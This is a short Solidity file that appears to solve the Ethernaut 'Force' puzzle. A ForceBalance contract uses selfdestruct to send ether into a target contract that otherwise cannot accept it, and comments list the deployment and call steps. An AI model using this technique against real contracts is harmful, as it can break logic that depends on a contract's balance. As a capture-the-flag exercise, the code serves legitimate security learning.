// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

// https://docs.soliditylang.org/en/v0.8.13/introduction-to-smart-contracts.html#deactivate-and-self-destruct
contract ForceBalance {
    Force public forceThemBalance;

    constructor (address _contract) payable {
        forceThemBalance = Force(_contract);
    }

    function deleteToForceBalance (address meow) external {
        selfdestruct(payable(meow));   
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {}

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}
}

// Transfer ETH using Metamask
// Call delete function through Etherscan
// Profit???